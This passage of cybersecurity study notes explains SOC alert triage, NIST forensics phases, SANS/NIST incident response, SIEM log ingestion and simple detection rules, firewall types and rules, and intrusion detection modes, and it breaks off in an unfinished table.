To successfully triage an alert, the analyst must answer the **"5 Ws"**. 


*Example Alert: Malware detected on Host: GEORGE PC*

| The "W" | What it asks | Example Answer |
| :--- | :--- | :--- |
| **What?** | What exactly happened? | A malicious file was detected inside the organization’s network. |
| **When?** | What is the exact timestamp? | The file was detected at 13:20 on June 5, 2024. |
| **Where?** | Where did it happen? | The file was located in the directory of the host: "GEORGE PC". |
| **Who?** | Which user account is involved? | The file was downloaded by the user account "George". |
| **Why?** | What is the root cause/motive? | The user attempted to bypass licensing by downloading a pirated software crack from a malicious website. |

### Key Concepts: Reporting and Escalation
Once an alert is triaged and confirmed as a true threat, it cannot just be ignored. 
* **Escalation:** The alert is packaged into a ticket and escalated to higher-level analysts (Level 2 or 3) for resolution.
* **Evidence:** A proper report *must* include the answers to the 5 Ws, a thorough summary of the analyst's investigation, and concrete evidence (like screenshots of logs or packet captures).

### Key Concepts: Incident Response & Forensics
For highly critical or complex malicious activities, standard triage is not enough.
* **Incident Response (IR):** High-level teams are brought in to contain the threat, eradicate the attacker from the network, and recover normal business operations.

* **Digital Forensics:** A deep-dive investigation analyzing system artifacts (memory dumps, hard drives, network traffic) to determine the exact root cause and timeline of the breach.

### Key Takeaways
If you escalate a ticket to a Level 2 Analyst without answering the 5 Ws or attaching evidence, they will likely send it right back to you! Building a habit of writing clear, comprehensive reports is just as important as knowing how to find the malware in the first place.

**Technology**

* **Objective:** Understand how security solutions centralize information and automate detection and response capabilities to minimize manual effort for the SOC team.

### Key Concepts: The Role of Technology
Even with the best **People** and **Processes**, it is impossible to manually monitor every single device and application on a corporate network. **Technology** acts as the force multiplier, centralizing data and automating the heavy lifting so analysts can focus on actual threats.

### Core Security Solutions

#### 1. SIEM (Security Information and Event Management)
The absolute core of most SOC environments. It acts as the central brain for log aggregation and analysis.

* **How it works:** It collects logs from various network devices (log sources) and correlates them. It then applies pre-configured detection rules (and increasingly, Machine Learning and User Behavior Analytics) to identify suspicious activity.
* **Important Limitation:** A traditional SIEM provides **Detection** capabilities only. It alerts the team, but it does not actively stop the threat on its own.

#### 2. EDR (Endpoint Detection and Response)
Focused entirely on individual devices (endpoints like laptops, servers, and mobile phones).

* **How it works:** Provides deep, real-time, and historical visibility into what is happening on a specific machine. 
* **Key Advantage:** Unlike a SIEM, EDR includes built-in **Response** capabilities. Analysts can use it to automatically isolate an infected machine from the network with just a few clicks.

#### 3. Firewall
The traditional perimeter defense. It acts as the bouncer between your safe internal network and the dangerous external internet.

* **How it works:** It continuously monitors incoming and outgoing network traffic. By applying a strict set of rules, it filters out and blocks unauthorized or malicious traffic before it can ever reach the internal network.

### Other Notable Technologies
Depending on the organization's budget and threat surface, a SOC may also deploy:
* **Antivirus / EPP** (Endpoint Protection Platform)
* **IDS / IPS** (Intrusion Detection/Prevention Systems)
* **XDR** (Extended Detection and Response)
* **SOAR** (Security Orchestration, Automation, and Response)

### Key Takeaways
If a threat actor tries to download malware from the internet, the **Firewall** might block it. If it gets through, the **EDR** on the employee's laptop might catch the file executing. Meanwhile, the **SIEM** is collecting logs from both the firewall and the laptop to give the SOC Analyst the full picture of the attack!

---

## Room: [Digital Forensics Fund.]

**Digital Forensics Methodology**

* **Objective:** Understand the official NIST 4-phase framework for conducting digital forensics and identify the various sub-disciplines within the field.

### Key Concepts: The NIST Digital Forensics Process
The National Institute of Standards and Technology (NIST) defines a strict, four-step methodology that investigators must follow to ensure evidence remains legally admissible and analytically sound.



| Phase | Description | Key Goal |
| :--- | :--- | :--- |
| **1. Collection** | Identifying and gathering all potential sources of data at the crime scene (PCs, USBs, cameras). | Ensure the **original data is never tampered with** and maintain strict documentation (Chain of Custody). |
| **2. Examination** | Filtering the massive amounts of collected raw data to extract only the information relevant to the case. | Reduce the "noise." (e.g., filtering a hard drive to only show files created on the specific day of the crime). |
| **3. Analysis** | Correlating the filtered evidence to draw factual conclusions and build a chronological timeline of events. | Determine exactly *how* the event happened and map out the relevant activities. |
| **4. Reporting** | Creating a comprehensive document detailing the methodology, findings, and recommendations. | Present complex technical findings in a way that both Law Enforcement and Executive Management can understand. |

### Key Concepts: Types of Digital Forensics
Because evidence can exist anywhere on a modern network, investigators often specialize in specific domains of digital forensics.



* **Computer Forensics:** The most common branch; focuses on traditional endpoints like desktops and laptops.
* **Mobile Forensics:** Extracting GPS data, call logs, SMS, and app data from smartphones and tablets.
* **Network Forensics:** Analyzing captured network traffic logs (PCAPs) to track data moving across the wire (useful when device logs are deleted).
* **Database Forensics:** Investigating unauthorized intrusions, data modifications, or exfiltration within dedicated database servers.
* **Cloud Forensics:** Investigating data hosted on infrastructure like AWS or Azure. *(Note: This is notoriously difficult because investigators lack physical access to the hardware).*
* **Email Forensics:** Tracing the origins, headers, and attachments of emails to investigate phishing, fraud, or harassment campaigns.

### Key Takeaways
**The Golden Rule of Forensics:** Never analyze the original evidence! During the **Collection** phase, investigators must take perfect, bit-by-bit cryptographic clones of the drives. All **Examination** and **Analysis** must be done on the copies to prevent accidentally altering the original crime scene data.

**Evidence Acquisition**

### Key Concepts: The Rules of Evidence
The primary goal of the collection phase is to ensure the evidence remains **legally admissible**. If the defense in a court case can prove the evidence *might* have been altered, the entire investigation is compromised.

#### 1. Proper Authorization
Before a single cable is unplugged, the forensics team must obtain explicit legal authorization (like a search warrant or written corporate consent). 
* **Why it matters:** Digital evidence contains highly sensitive, private data. Collecting it without prior approval violates privacy laws and instantly makes the evidence inadmissible in court.



#### 2. Chain of Custody
A formal, continuous document that tracks the exact lifecycle of a piece of evidence from the moment it is found until it is presented in court.
* **The Problem:** If a suspect's laptop sits in an unlocked room for three days, anyone could have walked in and planted fake evidence on it.
* **The Solution:** The Chain of Custody form proves exactly who had the evidence at all times, ensuring accountability and proving the data's integrity.

**Essential Chain of Custody Details:**
| Key Detail | Description |
| :--- | :--- |
| **Evidence Info** | Exact description of the item (e.g., "Black iPhone 13, 128GB, cracked screen"). |
| **Collector** | The full name and signature of the investigator who seized it. |
| **Timestamp** | The exact date and time the evidence was initially collected. |
| **Storage Location** | The secure physical location where the evidence is being held (e.g., "Locker 4, Evidence Room B"). |
| **Access Log** | A running, signed record of *every single person* who checks the evidence out, accesses it, and puts it back. |


#### 3. Use of Write Blockers
A Write Blocker is a specialized hardware device (or software utility) that sits between the suspect's hard drive and the investigator's forensic workstation.
* **The Problem:** Simply plugging a hard drive into a Windows or Linux machine will cause the operating system to automatically run background tasks that alter file timestamps or write hidden files (like `.DS_Store` or `Thumbs.db`). This alters the crime scene.
* **The Solution:** The write blocker physically intercepts and blocks any "write" commands sent to the drive, allowing the investigator to "read" and copy the data while guaranteeing the original suspect drive remains 100% untouched and unchanged.

### Key Takeaways
**The Golden Rule:** Always image the drive through a Write Blocker! You never perform analysis on the original hard drive. You use the write blocker to create a bit-by-bit cryptographic clone of the drive, and then you perform all your filtering and analysis on the *copy*.

**Windows Forensics**

### Key Concepts: Disk vs. Memory Images
When an investigator secures a suspect's Windows computer, they must create bit-by-bit forensic copies of the data. This data is split into two strict categories based on how it reacts to losing power.



* **1. Memory Image (Volatile Data):** * **What it is:** A snapshot of the system's active RAM.
  * **What it contains:** Running processes, open files, active network connections, clipboard contents, and sometimes even plaintext passwords or encryption keys.
  * **The Catch:** It is *volatile*. If the computer is powered off or restarted, **all of this data is permanently lost.**
  * *Golden Rule:* You must ALWAYS capture the Memory Image *first* while the machine is still running, before you pull the plug to seize the hardware.

* **2. Disk Image (Non-Volatile Data):**
  * **What it is:** A complete clone of the storage drives (HDD, SSD, USBs).
  * **What it contains:** Operating system files, media, documents, installed software, and internet browsing history.
  * **The Catch:** It is *non-volatile*. This data will survive a reboot or power loss, meaning it can be safely imaged later in a lab using a write blocker.

### Key Concepts: Standard Windows Forensic Tools
There are specific tools designed to capture and analyze these different types of images. 


| Tool Name | Purpose | Data Type | Description |
| :--- | :--- | :--- | :--- |
| **FTK Imager** | Acquisition & Analysis | Disk & Memory | A widely used, user-friendly GUI tool used primarily to create forensically sound disk images. |
| **DumpIt** | Acquisition | Memory | A fast, lightweight command-line utility used to dump the contents of Windows RAM into a raw image file. |
| **Autopsy** | Analysis | Disk | A massive open-source digital forensics platform. Used to analyze disk images, recover deleted files, check metadata, and search for keywords. |
| **Volatility** | Analysis | Memory | The industry standard for RAM analysis. It uses a command-line interface and specific plugins to extract running processes and network connections from a memory dump. |

### Key Takeaways
If you walk into a room and a suspect's computer is turned *on*, **do not turn it off!** If you pull the power cable before dumping the RAM with a tool like `DumpIt`, you will destroy the volatile evidence forever.

---

## Room: [Incident Response Fundamentals]

### Key Concepts: The Event Pipeline
Every computing device runs hundreds of background and interactive processes. Every action these processes take generates an **Event**.

1. **Events to Logs:** Because the sheer volume of daily events is impossible for a human to read, they are ingested into centralized security solutions (like a SIEM) as **Logs**.
2. **Logs to Alerts:** The security solution constantly scans these logs. When it detects a pattern that matches known harmful activity, it triggers an **Alert** for the SOC team to investigate.



### Key Concepts: Alert Classification
Once an alert is triggered, a SOC Analyst must investigate it to determine if the threat is real or just a misunderstanding by the automated software.

| Classification | Definition | Example Scenario | Result |
| :--- | :--- | :--- | :--- |
| **False Positive** | The security tool flagged an activity as dangerous, but human analysis proves it is actually harmless business activity. | An alert fires for "Massive Data Exfiltration." The analyst discovers it was just a scheduled, authorized server backup to the cloud. | The alert is closed and the detection rule may be tuned to ignore this in the future. |
| **True Positive** | The security tool flagged an activity as dangerous, and human analysis confirms it *is* an actual cyber attack. | An alert fires for a "Phishing Attempt." The analyst confirms the email contains a malicious credential-stealing link. | The alert is officially upgraded to an **Incident**. |

### Key Concepts: Incident Severity
When a True Positive is confirmed, it becomes an **Incident**. If a SOC receives dozens of incidents at the same time, they cannot handle them all at once. They must prioritize based on severity and potential business impact.

* **Critical Severity:** Stop everything. Active breach, massive data loss occurring, or core business operations are down. (Highest Priority).
* **High Severity:** Significant threat, but contained to a specific area or less critical system.
* **Medium Severity:** Targeted attack that was blocked, or a localized malware infection that hasn't spread.
* **Low Severity:** Routine, automated attacks (like basic port scanning) that pose very little immediate risk.

### Key Takeaways
**The False Positive Problem:** A major part of a Level 1 SOC Analyst's job is hunting down False Positives. If a security tool generates too many False Positives, the team suffers from "alert fatigue" and might accidentally ignore a True Positive when a real attack happens!

**Types of Incidents**

* **Objective:** Understand the specific categories of cyber security incidents and recognize why the severity of an attack heavily depends on the target organization's business model.

### Key Concepts: Incident Classifications
In the cybersecurity industry, we don't just call everything "a hack." When a True Positive alert is upgraded to an incident, it is categorized into one (or more) of the following types so the Incident Response team knows exactly what they are dealing with.

| Incident Type | Description | Key Characteristics |
| :--- | :--- | :--- |
| **Malware Infections** | Malicious software designed to damage or disrupt a system, network, or application. | Often the result of a user executing a malicious file or document (like an email attachment). |
| **Security Breaches** | When an unauthorized external person successfully bypasses defenses to gain access to confidential data or systems. | Highly critical for businesses that rely on keeping proprietary data or customer information secret. |
| **Data Leaks** | Confidential information is exposed to unauthorized entities. | Unlike a breach, a leak isn't always a malicious attack. It is frequently caused unintentionally by human error or cloud misconfigurations (like an unsecured AWS S3 bucket). |
| **Insider Attacks** | A malicious attack originating from *within* the organization (e.g., a disgruntled employee). |  Extremely dangerous because the attacker already has legitimate access and knowledge of the network defenses. |
| **Denial of Service (DoS)** | An attacker floods a system, network, or application with overwhelming amounts of fake traffic. |  Designed to exhaust the server's resources so legitimate users cannot access it, directly violating the "Availability" pillar of cybersecurity. |

### Key Concepts: Contextual Severity
It is vital to understand that incidents cannot be universally ranked by severity. **The impact of an incident is entirely dependent on the victim organization's core business.**

* **Scenario A (E-Commerce):** A DoS attack takes down an online retailer's primary website on Black Friday. *Impact: Disastrous (Millions of dollars in lost revenue).* A small data leak of public catalog items. *Impact: Minor.*
* **Scenario B (Healthcare):** A hospital suffers a massive data leak of highly confidential patient medical records. *Impact: Disastrous (HIPAA fines, lawsuits, destroyed reputation).* A DoS attack on their public informational blog. *Impact: Minor.*


### Key Takeaways
When you are triaging alerts, always keep your specific organization's "crown jewels" in mind. An attack that targets your company's most critical assets should always be escalated to a **Critical Severity** incident faster than a generic attack!

**Incident Response Frameworks (SANS vs. NIST)**

### Key Concepts: Why Use a Framework?
Because every cyber incident is chaotic and unique, organizations need a strict, repeatable process to follow so they don't panic or make mistakes during a live breach. Two major organizations define the industry standards for this: **SANS** and **NIST**.



### 1. The SANS Framework (PICERL)
SANS defines a 6-phase incident response lifecycle. A great way to memorize this for exams is the acronym **PICERL**.

| Phase | Description | Example Activity |
| :--- | :--- | :--- |
| **P** - Preparation | Building resources and defenses *before* an incident happens. | Writing an Incident Response Plan; conducting employee anti-phishing training. |
| **I** - Identification | Detecting abnormal behavior and confirming an incident is actually occurring. | A SOC analyst noticing massive data exfiltration and confirming a host is compromised. |
| **C** - Containment | Stopping the "bleeding" and preventing the attack from spreading further. | Disconnecting the infected machine from the network; disabling a compromised user account. |
| **E** - Eradication | Removing the root cause of the threat from the environment entirely. | Running deep malware scans to delete the malicious files from the host. |
| **R** - Recovery | Restoring systems to normal, secure business operations. | Rebuilding the machine from a clean image and restoring lost data from secure backups. |
| **L** - Lessons Learned | Documenting what went wrong and how to improve defenses for next time. | Holding a post-incident review meeting to update firewall rules so the attack cannot happen again. |

### 2. The NIST Framework Comparison
The National Institute of Standards and Technology (NIST) offers a very similar framework, but it condenses the lifecycle into **4 phases**. 



* **Preparation:** (Matches SANS)
* **Detection & Analysis:** (Matches SANS *Identification*)
* **Containment, Eradication, & Recovery:** (Combines three SANS phases into one continuous, overlapping response effort)
* **Post-Incident Activity:** (Matches SANS *Lessons Learned*)

### Key Concepts: The Incident Response Plan (IRP)
Frameworks act as the generic blueprint, but an organization must create its own specific **Incident Response Plan (IRP)** based on those frameworks. This is a formal, management-approved document that details exactly what the company will do during a breach.

**Key Components of an IRP:**
* **Roles & Responsibilities:** Who is the incident commander? Who talks to the press?
* **Response Methodology:** The step-by-step technical procedures.
* **Communication Plan:** How to securely communicate when internal systems (like Slack or Email) are compromised, and when to loop in Law Enforcement.
* **Escalation Path:** Who gets called at 3:00 AM on a Sunday if a critical server goes down.

### Key Takeaways
**Containment comes BEFORE Eradication!** A common mistake is trying to delete malware while the machine is still connected to the internet. The attacker will just keep re-infecting the machine. Always isolate (Contain) the system first!

**Incident Response Techniques**

### Key Concepts: Detection & Analysis Solutions
Manually hunting for abnormal behavior across a massive corporate network is impossible. SOC teams rely on these core technologies to execute the Identification/Detection phases of their incident response frameworks.



| Solution | Definition | Primary Role |
| :--- | :--- | :--- |
| **SIEM** | Security Information and Event Management | The "Central Brain." Collects, aggregates, and correlates logs from across the entire network to identify broader incidents. |
| **AV** | Antivirus | The "Traditional Guard." Scans individual systems to detect and block *known* malicious programs using signature-based detection. |
| **EDR** | Endpoint Detection and Response | The "Advanced Guard." Deployed on individual endpoints to monitor for advanced, behavior-based threats. *Crucially, EDR can actively respond (contain/eradicate) threats, not just detect them.* |

### Key Concepts: Playbooks vs. Runbooks
When an incident is confirmed, analysts don't just guess what to do next. They follow strict, pre-approved documentation to save time and ensure no critical steps are missed.



* **Playbook:** The high-level **Guidelines**. It dictates *what* steps need to be taken to handle a specific type of incident comprehensively from start to finish. 
* **Runbook:** The low-level **Execution**. It dictates exactly *how* to perform a specific step within a playbook, providing detailed, technical, step-by-step instructions (e.g., the exact CLI commands to run to isolate a host).

#### Example Playbook: Phishing Email
If a user reports a suspicious email, the SOC Analyst will pull up the "Phishing Playbook" and follow these high-level steps:

1. **Notify** all relevant stakeholders that a phishing incident is being investigated.
2. **Analyze** the email headers and body to determine if it is genuinely malicious.
3. **Inspect** any attached files or embedded links in a safe sandbox environment.
4. **Determine Impact** by checking logs to see if anyone actually clicked the link, downloaded the attachment, or submitted their credentials.
5. **Isolate (Contain)** any infected systems from the corporate network immediately.
6. **Block (Eradicate)** the malicious sender's email address and domain at the email gateway.

### Key Takeaways
**Think of it like cooking:** The **Playbook** is the overall menu for the dinner party (Soup, Steak, Cake). The **Runbook** is the exact recipe detailing how many teaspoons of salt to put into the soup!

---

## Room: [Introduction to SIEM]

*  **SIEM:** Security Information and Event Management system that is used to aggregate security information in the form of logs, alerts, artifacts and events into a centralized platform that would allow security analysts to perform near real-time analysis during security monitoring. / Security Information and Event Management (SIEM) is a security solution that collects logs from various types of log sources, standardizes their format into a consistent one, correlates them, and detects malicious activities using detection rules.

**Log Sources and Challenges**

**Key Concepts:**
* **The Logging Ecosystem:** Every device in a network (endpoints, servers, firewalls, routers) continuously generates logs. These act as the fundamental breadcrumbs for identifying malicious activity.
* **Categories of Log Sources:**
    * **Host-Centric Logs:** Events that happen *inside* a specific endpoint or server (e.g., Windows, Linux).
        * *Examples:* A user authenticating, a process executing, PowerShell commands running, registry keys being modified, or local file access.
    * **Network-Centric Logs:** Events generated when devices communicate with *each other* or the internet. These come from infrastructure devices (e.g., Firewalls, Routers, IDS/IPS).
        * *Examples:* SSH connections, FTP file transfers, web traffic routing, or VPN access.



* **The Problem (Why we need a SIEM):**
    * **Numerous Sources:** A network has hundreds of devices generating thousands of logs per second.
    * **No Centralization:** Manually SSH-ing or RDP-ing into individual machines to check their local logs is incredibly inefficient during a time-sensitive incident.
    * **Limited Context:** A single log on a single machine might look innocent (e.g., a file being read). You need to correlate it with network logs to see that the user reading the file just came through a malicious VPN connection.
    * **Limited Analysis:** The sheer volume of data makes manual human analysis impossible; critical alerts will be missed.
    * **Format Issues:** Different vendors use completely different log formats (Syslog, EVTX, JSON, etc.), making it hard to parse them uniformly.

**Takeaways / Notes:**
* If you cannot correlate a network event (how the attacker got in) with a host event (what the attacker did once inside), you cannot fully map an intrusion. This decentralized chaos is exactly the problem that a Security Information and Event Management (SIEM) system is built to solve.

**Features and Capabilities**

**Key Concepts:**
* **What is a SIEM?** A security solution that acts as the central brain for a Security Operations Center (SOC). It collects logs from every device on the network, standardizes them, and uses detection rules to spot malicious activity.
* **Centralized Log Collection:** Instead of logging into individual machines, a SIEM uses lightweight agents or APIs to pull all logs (from endpoints, servers, firewalls, routers) into one single dashboard.

* **Parsing vs. Normalization:**
    * **Parsing:** The act of breaking a raw, messy log file down into distinct, readable fields (e.g., extracting just the IP address or the Username).
    * **Normalization:** The act of taking completely different log formats (like a Windows EVTX log and a Linux Syslog) and converting them into one consistent, universal format so they can be easily searched and compared.

* **Log Correlation (The Superpower):** A SIEM analyzes logs from *different* sources to find relationships and patterns that indicate an attack. 
    * *Example Scenario:* 1. User logs in via VPN from an unfamiliar IP. *(Network Log)*
        2. User accesses documents on a shared drive. *(Host/File Log)*
        3. User executes a PowerShell script. *(Host/Process Log)*
        4. System makes a massive outbound network connection. *(Network/Firewall Log)*
    * *Conclusion:* Individually, these might look like normal IT activities. Correlated together, the SIEM alerts the analyst to a highly probable Data Exfiltration attack via compromised credentials.

* **Real-time Alerting:** SIEMs come with pre-built (and custom-written) detection rules. When logs match the conditions of a rule (like the correlation example above), an alert is triggered for the SOC analysts to investigate.
* **Dashboards & Reporting:** Visual representations of the data. Dashboards give analysts a bird's-eye view of network health, top triggered rules, failed logins, and total ingested events.


**Takeaways / Notes:**
* **Splunk** is one of the most widely used enterprise SIEMs in the industry, but others like **QRadar**, **Elastic Security**, and **Microsoft Sentinel** all rely on these exact same core features.

**Log Sources and Ingestion**

### 1. Common Log Sources (Where the data lives)
Every device generates logs, but knowing exactly where to look on different operating systems is a fundamental skill for any security analyst.

**Windows Endpoints:**
* **Tool:** Windows Event Viewer.
* **Mechanism:** Windows assigns a unique **Event ID** to every type of activity (e.g., Event ID 4624 is a successful logon). This makes filtering and tracking specific behaviors much easier.


**Linux Endpoints:**
Linux systems typically store their logs in the `/var/log/` directory. 
* `/var/log/httpd` or `/var/log/apache2`: HTTP web server requests, responses, and errors.
* `/var/log/cron`: Records of scheduled automated tasks (cron jobs).
* `/var/log/auth.log` (Debian/Ubuntu) or `/var/log/secure` (RedHat/CentOS): Authentication events, SSH logins, and `sudo` usage.
* `/var/log/kern`: Kernel-level events and hardware errors.

*Example Cron Log:*
> `May 28 13:04:20 ebr crond[2843]: /usr/sbin/crond 4.4 dillon's cron daemon, started with loglevel notice`

**Web Servers (Apache/Nginx):**
Monitoring web traffic is critical for spotting attacks like SQL Injection or Cross-Site Scripting (XSS). These logs record the exact timestamp, source IP, HTTP method, requested URI, and the user's browser (User-Agent).

*Example Apache Log:*
> `192.168.21.200 - - [21/March/2022:10:17:10 -0300] "GET /cgi-bin/try/ HTTP/1.0" 200 3395 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)..."`

---

### 2. Log Ingestion (Getting the data to the SIEM)
Once you know where the logs are, you have to transport them to the SIEM for normalization and correlation. 



There are four primary ways to ingest data:
1. **Agents / Forwarders:** A lightweight piece of software installed directly on the endpoint (e.g., a Splunk Universal Forwarder or Elastic Agent). It continuously reads local log files and securely forwards them to the SIEM server.
2. **Syslog:** A standard network protocol used heavily by Linux machines, firewalls, and routers to send real-time event messages to a centralized logging server over the network.
3. **Port-Forwarding:** The SIEM is configured to listen on a specific network port, and endpoints or network devices are configured to stream their raw data directly to that IP and port.
4. **Manual Upload:** Useful for offline analysis, historical investigations, or CTF challenges. Analysts can manually upload static `.csv`, `.json`, or `.evtx` files directly into the SIEM interface.

**Takeaways / Notes:**
* In a modern enterprise, **Agents** and **Syslog** are by far the most common continuous ingestion methods. If an agent goes offline, the SIEM stops receiving data from that host, which is often an early warning sign of a compromised or failing machine!

**Alerting Process and Analysis**

**Key Concepts:**
* **The Magic Behind Alerts:** SIEMs do not magically know what is malicious. They rely on **Detection Rules** written by analysts. These rules are essentially logical "If-Then" statements that continuously monitor the incoming stream of normalized logs.
* **Why Normalization Matters:** Rules look for specific values in specific fields (e.g., `EventID = 4688`). If the SIEM hasn't normalized the logs into standard field names, the rules will fail to trigger!



### Building a Detection Rule (Use Cases)
To catch an attacker, you have to know what their digital footprints look like. 

**Use Case 1: Covering Tracks (Log Clearing)**
* **The Behavior:** Attackers frequently clear event logs to hide their activity. In Windows, clearing the log generates Event ID `104`.
* **The Rule Logic:** `IF (LogSource == WinEventLog) AND (EventID == 104) THEN Trigger Alert: "Event Log Cleared"`

**Use Case 2: Post-Exploitation Discovery**
* **The Behavior:** After gaining access, an attacker will often run the `whoami` command to check their current privilege level. Windows logs new process creations under Event ID `4688`.
* **The Rule Logic:** `IF (LogSource == WinEventLog) AND (EventCode == 4688) AND (NewProcessName CONTAINS "whoami") THEN Trigger Alert: "WHOAMI Command Execution Detected"`

---

### The Alert Investigation Workflow
When a rule's conditions are met, an alert pops up on the SIEM dashboard. The analyst must then review the raw logs and determine the verdict.



| Verdict | Definition | Next Steps |
| :--- | :--- | :--- |
| **False Positive (FP)** | The rule triggered, but the activity was benign/normal (e.g., an IT admin running a scheduled script). | **Tune the Rule:** Adjust the logic to exclude this specific benign behavior in the future to prevent "alert fatigue." |
| **True Positive (TP)** | The rule accurately caught malicious, unauthorized, or highly suspicious activity. | **Incident Response:** Investigate further, contact the asset owner, isolate the infected host from the network, or block the malicious IP at the firewall. |

**Takeaways / Notes:**
* Writing good detection rules is a balancing act. If a rule is too broad, it generates too many False Positives (overwhelming the analysts). If it is too specific, it might miss a slightly modified attack (a False Negative).

---

# Room: [Firewall Fundamentals]

* **Firewall:** A security tool, hardware or software that is used to filter network traffic by stopping unauthorized incoming and outgoing traffic. A firewall is designed to inspect a network's or digital device’s incoming and outgoing traffic.

**Types of Firewalls**

**Key Concepts:**
Firewalls are essential network security devices that filter harmful traffic. As network attacks have evolved, so have firewalls, leading to several distinct types with varying levels of complexity and inspection depth.



### 1. Stateless Firewall
* **OSI Layers:** Operates on **Layer 3** (Network) and **Layer 4** (Transport).
* **How it works:** Filters data strictly based on predetermined, static rules (like source/destination IP or port). 
* **The Catch (No Memory):** It evaluates *every single packet* in isolation. It maintains zero context or "state" of previous connections. If it drops a bad packet from an IP, it doesn't remember that IP is bad; the next packet from that same IP will be evaluated all over again from scratch.
* **Pros/Cons:** Because it doesn't have to check a memory table, it processes packets extremely quickly. However, it cannot apply complex security policies.

### 2. Stateful Firewall
* **OSI Layers:** Operates on **Layer 3** and **Layer 4**.
* **How it works:** Goes beyond simple rule-matching by keeping track of active connections in a **state table** (it has memory!).
* **The Advantage:** If a connection is established and approved, future packets belonging to that exact same connection flow through automatically without needing deep, individual inspection. Conversely, if a connection is deemed malicious, all subsequent packets from that source are automatically dropped.

### 3. Proxy Firewall (Application-Level Gateway)
* **OSI Layers:** Operates on **Layer 7** (Application).
* **How it works:** Acts as a middleman (intermediary) between the internal private network and the public internet. 
* **The Advantage:** Unlike stateless/stateful firewalls, a proxy can actually inspect the *content* (payload) of the packet. It also masks the internal IP addresses by forwarding requests using its own IP, providing anonymity. It is excellent for strict content filtering policies.

### 4. Next-Generation Firewall (NGFW)
* **OSI Layers:** Operates from **Layer 3 up to Layer 7**.
* **How it works:** The most advanced iteration. It combines the features of traditional firewalls with deep packet inspection and active threat prevention.
* **Key Features:**
    * **Intrusion Prevention System (IPS):** Blocks malicious activity in real-time.
    * **Heuristic Analysis:** Analyzes attack patterns to block zero-day threats before they enter the network.
    * **SSL/TLS Decryption:** Can decrypt, inspect, and re-encrypt secure web traffic to ensure malware isn't hiding in encrypted packets.
    * Integrates with Threat Intelligence feeds for up-to-date decision making.

---

### Firewall Characteristics Summary Table

| Firewall Type | Key Characteristics |
| :--- | :--- |
| **Stateless Firewalls** | - Basic filtering <br> - Keeps no track of previous connections <br> - Highly efficient for high-speed networks |
| **Stateful Firewalls** | - Recognizes traffic by patterns <br> - Can apply complex rules <br> - Monitors and remembers active network connections |
| **Proxy Firewalls** | - Inspects the actual data/payload inside packets <br> - Provides content filtering options <br> - Provides application control <br> - Decrypts and inspects SSL/TLS data packets |
| **Next-Generation Firewalls (NGFW)** | - Provides advanced threat protection <br> - Includes an integrated Intrusion Prevention System (IPS) <br> - Identifies anomalies using heuristic analysis <br> - Decrypts and inspects SSL/TLS data packets |

**Rules and Configurations**

**Key Concepts:**
While firewalls come with built-in default policies, security teams must define custom rules to control exactly what traffic is allowed in or out of their specific network environment. 



### 1. Basic Components of a Firewall Rule
Every rule you create will generally consist of these six core fields:
* **Source Address:** The IP address of the machine originating the traffic.
* **Destination Address:** The IP address of the machine receiving the traffic.
* **Port:** The specific network port number being used (e.g., 80 for HTTP, 22 for SSH).
* **Protocol:** The communication protocol (e.g., TCP, UDP, ICMP).
* **Direction:** Whether the rule applies to incoming or outgoing traffic.
* **Action:** What the firewall should actually *do* with the packet if it matches this rule.

---

### 2. Types of Actions
When a data packet matches the criteria of a rule, the firewall will execute one of three primary actions:

**A. Allow**
Permits the specified traffic to pass through the firewall. 
* *Example:* Allowing all internal users to browse the public internet (HTTP port 80).

| Action | Source | Destination | Protocol | Port | Direction |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Allow** | 192.168.1.0/24 | Any | TCP | 80 | Outbound |

**B. Deny**
Blocks the specified traffic, dropping the packets entirely. This is fundamental for reducing the network's attack surface.
* *Example:* Blocking outside internet traffic from initiating an SSH connection (Port 22) to a critical internal server.

| Action | Source | Destination | Protocol | Port | Direction |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Deny** | Any | 192.168.1.0/24 | TCP | 22 | Inbound |

**C. Forward**
Redirects traffic to a different network segment. This is used by firewalls that also act as routing gateways.
* *Example:* Forwarding any incoming public HTTP traffic directly to the internal Web Server (`192.168.1.8`).

| Action | Source | Destination | Protocol | Port | Direction |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Forward** | Any | 192.168.1.8 | TCP | 80 | Inbound |

---

### 3. Directionality of Rules
Firewall rules are strictly categorized based on which way the traffic is flowing. 



* **Inbound Rules:** Applied only to traffic *entering* the network (e.g., allowing external users to view your hosted website).
* **Outbound Rules:** Applied only to traffic *leaving* the network (e.g., preventing internal employee workstations from sending outbound SMTP email traffic, forcing them to use the designated mail server instead).
* **Forward Rules:** Applied to traffic that is being routed *through* or *inside* the network segments.

**Takeaways / Notes:**
* When building firewall rules, remember the principle of "Implicit Deny." Generally, a firewall will process rules from top to bottom. If traffic doesn't explicitly match an "Allow" rule, the default action at the very bottom of the list is always to "Deny."

---

## Room: [IDS Fundamentals]

### 1. Deployment Modes (Where the IDS sits)
An IDS can monitor activity at the individual device level or across the entire network infrastructure.

* **HIDS (Host Intrusion Detection System):** * **How it works:** Installed directly on individual endpoints (hosts).
    * **Pros:** Provides incredibly detailed visibility into that specific machine's activities (file changes, process executions).
    * **Cons:** Highly resource-intensive and difficult to manage at scale across thousands of machines.
* **NIDS (Network Intrusion Detection System):**
    * **How it works:** Placed at strategic points within the network to monitor traffic flowing between all hosts.
    * **Pros:** Provides a centralized, bird's-eye view of potentially malicious activities moving across the wire.


### 2. Detection Modes (How the IDS thinks)
Once an IDS sees the data, it uses different logical engines to determine if that data is malicious.

* **Signature-Based IDS:**
    * **How it works:** Compares incoming traffic against a database of known attack patterns (signatures), much like traditional antivirus software. 
    * **Pros:** Very fast and highly efficient at catching known threats with low false positives. *(Note: We will be exploring **Snort**, a famous signature-based IDS, soon).*
    * **Cons:** Completely blind to "Zero-Day" attacks (new attacks that do not have a signature yet).
* **Anomaly-Based IDS:**
    * **How it works:** First learns what "normal" network behavior looks like (establishing a baseline). It then flags any traffic that deviates from this baseline as suspicious.
    * **Pros:** Highly capable of catching brand-new, Zero-Day attacks since it doesn't rely on known signatures.
    * **Cons:** Prone to high False Positive rates. Legitimate but unusual activity (like a user downloading a massive file for the first time) will trigger alerts unless the system is carefully fine-tuned.
* **Hybrid IDS:**
    * **How it works:** Combines both engines. It uses signatures to quickly swat down known threats while using anomaly detection to catch suspicious, unseen behavior.


### Summary Table: Detection Modes

| Detection Mode | Best For | Main Weakness |
| :--- | :--- | :--- |
